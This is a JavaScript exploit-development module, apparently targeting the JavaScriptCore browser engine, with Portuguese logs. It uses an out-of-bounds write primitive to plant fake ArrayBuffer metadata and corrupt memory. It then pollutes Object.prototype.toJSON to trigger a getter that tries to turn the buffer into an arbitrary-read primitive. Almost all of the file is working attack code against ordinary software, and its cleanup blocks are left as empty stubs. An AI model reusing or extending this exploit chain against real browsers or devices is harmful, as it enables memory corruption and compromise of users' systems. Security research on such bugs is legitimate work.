// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
let retype_leak_attempt_results = {};

const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };

    logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' é: ${Object.prototype.toString.call(this)}, id: ${this?.id}, é CheckpointObject?: ${this instanceof CheckpointObjectForRetype}`, "info", FNAME_toJSON);
    if (this instanceof CheckpointObjectForRetype) {
        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' É uma instância de CheckpointObjectForRetype. Tentando acessar getter '${GETTER_CHECKPOINT_PROPERTY_NAME}' diretamente.`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Acesso direto a this['${GETTER_CHECKPOINT_PROPERTY_NAME}'] completado. Se o getter foi chamado, um log dele deve aparecer.`, "info", FNAME_toJSON);
        } catch (e) {
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Erro ao acessar diretamente this['${GETTER_CHECKPOINT_PROPERTY_NAME}']: ${e.message}`, "error", FNAME_toJSON);
        }
    } else {
        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' NÃO é uma instância de CheckpointObjectForRetype.`, "warn", FNAME_toJSON);
    }
    return returned_payload;
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste de "Re-Tipagem" do oob_array_buffer_real via ShadowCraft ---`, "test", FNAME_TEST);

    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, message: "Não inicializado", error: null };

    // Validações de configuração... (mantidas como antes)
    if (!JSC_OFFSETS.ArrayBufferContents ||
        JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
        JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
        !JSC_OFFSETS.JSCell || JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined ||
        !JSC_OFFSETS.ArrayBuffer ||
        !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs ||
        JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) {
        logS3("Offsets críticos não estão definidos corretamente em config.mjs. Abortando teste.", "critical", FNAME_TEST);
        console.error("Detalhes dos Offsets Ausentes/Incorretos em config.mjs:", { /* ... */ });
        return;
    }
    const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) {
         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor esperado (2). Verifique config.mjs.`, "warn", FNAME_TEST);
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB. Abortando.", "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}, oob_dataview_real.byteLength: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);

        const shadow_metadata_offset_in_oob_data = 0x0;
        const arbitrary_read_size = new AdvancedInt64(0x1000, 0x0); // 4096

        logS3(`Escrevendo metadados sombra no offset de dados ${toHex(shadow_metadata_offset_in_oob_data)} do oob_array_buffer_real...`, "info", FNAME_TEST);
        // Escreve o TAMANHO (arbitrary_read_size) nos metadados sombra
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, // Offset 0x8
            arbitrary_read_size,
            8
        );
        // Escreve o PONTEIRO DE DADOS (ENDERECO_INVALIDO_PARA_LEITURA_TESTE) nos metadados sombra
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, // Offset 0x10
            ENDERECO_INVALIDO_PARA_LEITURA_TESTE, // 0x1
            8
        );
        logS3(`Metadados sombra configurados para apontar para: ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} com tamanho ${arbitrary_read_size.toString(true)}`, "info", FNAME_TEST);

        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        logS3(`Realizando escrita OOB gatilho em offset absoluto ${toHex(corruption_trigger_offset_abs)} com valor ${corruption_value.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);

        const checkpoint_obj = new CheckpointObjectForRetype(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true;
                const FNAME_GETTER = "RetypeGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" foi CHAMADO em this.id = ${this?.id || 'N/A'}!`, "vuln", FNAME_GETTER);

                // Teste 1: Tentar usar o oob_array_buffer_real original
                try {
                    logS3("DENTRO DO GETTER (Teste 1): Tentando criar DataView sobre oob_array_buffer_real (esperançosamente re-tipado)...", "info", FNAME_GETTER);
                    const retyped_dv_original_ab = new DataView(oob_array_buffer_real);
                    logS3(`DENTRO DO GETTER (Teste 1): DataView sobre oob_array_buffer_real criada. ByteLength: ${retyped_dv_original_ab.byteLength}. Esperado (sombra): ${arbitrary_read_size.low()}`, "good", FNAME_GETTER);

                    if (retyped_dv_original_ab.byteLength === arbitrary_read_size.low()) {
                        logS3(`DENTRO DO GETTER (Teste 1): SUCESSO ESPECULATIVO! ByteLength da DataView (${retyped_dv_original_ab.byteLength}) corresponde ao tamanho dos metadados sombra (${arbitrary_read_size.low()}). Tentando ler...`, "vuln", FNAME_GETTER);
                        const valorLido = retyped_dv_original_ab.getUint32(0, true); // Deve tentar ler de ENDERECO_INVALIDO_PARA_LEITURA_TESTE (0x1)
                        logS3(`DENTRO DO GETTER (Teste 1): Leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valorLido)}. Verifique se houve crash.`, "leak", FNAME_GETTER);
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem de oob_array_buffer_real PARECE ter funcionado. Lido ${toHex(valorLido)} de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}.`, error: null};
                    } else {
                        logS3(`DENTRO DO GETTER (Teste 1): ByteLength da DataView (${retyped_dv_original_ab.byteLength}) NÃO corresponde ao tamanho dos metadados sombra. Tentando ler do buffer original...`, "warn", FNAME_GETTER);
                        const valorLidoOriginal = retyped_dv_original_ab.getUint32(0, true); // Lê do buffer de dados original de oob_array_buffer_real
                        logS3(`DENTRO DO GETTER (Teste 1): Leitura do buffer original (offset 0) retornou ${toHex(valorLidoOriginal)}. Nenhum crash esperado aqui.`, "info", FNAME_GETTER);
                        // Marcar falha aqui porque o objetivo era re-tipar para o endereço inválido
                        if (!retype_leak_attempt_results.success) { // Só atualiza se não houve sucesso antes
                            retype_leak_attempt_results = { success: false, message: `Falha ao re-tipar oob_array_buffer_real. ByteLength (${retyped_dv_original_ab.byteLength}) != esperado (${arbitrary_read_size.low()}). Lido ${toHex(valorLidoOriginal)} do buffer original.`, error: null};
                        }
                    }
                } catch (e) {
                    logS3(`DENTRO DO GETTER (Teste 1): ERRO ao usar DataView sobre oob_array_buffer_real ou ler: ${e.message}`, "error", FNAME_GETTER);
                    // Se o ByteLength bateu com o dos metadados sombra E AQUI DEU ERRO, é o esperado para 0x1
                    if (e.message.includes("RangeError") || e.message.includes("memory access out of bounds") || e.message.includes("segmentation fault")) { // Adapte para erros comuns de acesso inválido
                        logS3(`DENTRO DO GETTER (Teste 1): O erro '${e.message}' pode ser o CRASH CONTROLADO esperado ao tentar ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}!`, "vuln", FNAME_GETTER);
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem de oob_array_buffer_real PARECE ter funcionado, erro '${e.message}' ao ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}.`, error: String(e) };
                    } else if (!retype_leak_attempt_results.success) {
                         retype_leak_attempt_results = { success: false, message: `Erro inesperado no Teste 1: ${e.message}`, error: String(e) };
                    }
                }

                // Teste 2: Tentar criar um NOVO ArrayBuffer e usá-lo, para ver se o estado do alocador/engine está confuso.
                // Esta é uma tentativa mais especulativa.
                try {
                    logS3("DENTRO DO GETTER (Teste 2): Tentando criar um NOVO ArrayBuffer (16 bytes)...", "info", FNAME_GETTER);
                    let newVictimAB = new ArrayBuffer(16);
                    logS3("DENTRO DO GETTER (Teste 2): NOVO ArrayBuffer criado. Tentando DataView sobre ele...", "info", FNAME_GETTER);
                    const dvOnNewAB = new DataView(newVictimAB);
                    logS3(`DENTRO DO GETTER (Teste 2): DataView sobre NOVO AB. ByteLength: ${dvOnNewAB.byteLength}. Tentando escrever e ler nele...`, "info", FNAME_GETTER);
                    dvOnNewAB.setUint32(0, 0x12345678, true);
                    const readFromNew = dvOnNewAB.getUint32(0, true);
                    if (readFromNew === 0x12345678) {
                        logS3(`DENTRO DO GETTER (Teste 2): Leitura/Escrita no NOVO ArrayBuffer funcionou normalmente (${toHex(readFromNew)}). Sem confusão aparente aqui.`, "good", FNAME_GETTER);
                    } else {
                         logS3(`DENTRO DO GETTER (Teste 2): Leitura/Escrita no NOVO ArrayBuffer FALHOU. Lido: ${toHex(readFromNew)}`, "error", FNAME_GETTER);
                    }
                } catch (e) {
                     logS3(`DENTRO DO GETTER (Teste 2): Erro ao criar ou usar NOVO ArrayBuffer: ${e.message}`, "error", FNAME_GETTER);
                }


                return 0xBADF00D; // Valor de retorno do getter
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true,
            enumerable: false,
            configurable: true
        });
        toJSONPollutionApplied = true;
        logS3(`Poluição de Object.prototype.${ppKey_val} e getter em CheckpointObjectForRetype aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify no checkpoint_obj (id: ${checkpoint_obj.id})...`, "info", FNAME_TEST);
        try {
            const jsonResult = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado. Resultado: ${jsonResult}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro durante JSON.stringify(checkpoint_obj): ${e.message}`, "error", FNAME_TEST);
            if (!retype_getter_called_flag) {
                 retype_leak_attempt_results.message = `Erro em JSON.stringify ANTES do getter ser chamado: ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no teste executeRetypeOOB_AB_Test: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        retype_leak_attempt_results.success = false;
        retype_leak_attempt_results.message = "Erro crítico no fluxo principal do teste.";
        retype_leak_attempt_results.error = String(mainError);
    } finally {
        // Restauração da poluição (mantida como antes)
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    if (retype_getter_called_flag) {
        if (retype_leak_attempt_results.success) {
            logS3(`RESULTADO DO TESTE DE RE-TIPAGEM: ${retype_leak_attempt_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO DO TESTE DE RE-TIPAGEM: Getter foi chamado, mas a re-tipagem não foi confirmada. Detalhes: ${retype_leak_attempt_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO DO TESTE: Getter NÃO foi chamado. A tentativa de re-tipagem não pôde ser verificada.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes completos da tentativa: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de "Re-Tipagem" (ShadowCraft) Concluído ---`, "test", FNAME_TEST);
}
